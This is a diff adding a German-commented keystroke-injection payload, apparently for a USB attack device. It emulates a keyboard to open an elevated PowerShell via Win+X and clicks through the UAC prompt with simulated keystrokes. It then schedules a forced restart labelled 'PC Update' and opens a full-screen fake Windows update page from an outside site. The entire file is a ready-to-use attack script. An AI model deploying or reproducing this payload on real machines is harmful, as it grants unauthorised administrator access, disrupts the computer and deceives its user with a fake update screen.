@@ -1,0 +1,34 @@
+REM Payload 4
+REM In Payload 4 möchte ich den Computer neustarten.
+REM Zusätzlich, soll es so wirken, als ob der PC ein Update bekommt.
+
+REM Zuerst ATTACKMODE wählen
+ATTACKMODE HID STORAGE
+
+REM Jetzt Win+X Menü öffnen
+GUI x
+DELAY 50
+
+REM Jetzt öffne ich Powershell
+STRING a
+DELAY 40
+
+REM Jetzt muss ich die Zustimmung für Administrator geben
+LEFTARROW
+DELAY 50
+ENTER
+DELAY 50
+
+REM Jetzt fügen wir den Command ein
+STRING shutdown /r /t 500 /c "PC Update"
+DELAY 300
+ENTER
+
+REM Jetzt starte ich den Fake Update Bildschirm
+STRING Start-Process iexplore -ArgumentList "-k http://fakeupdate.net/win10ue/"
+DELAY 50
+
+REM Wir müssen jetzt in den Vollbildschirm.
+F11
+
+REM Fertig!
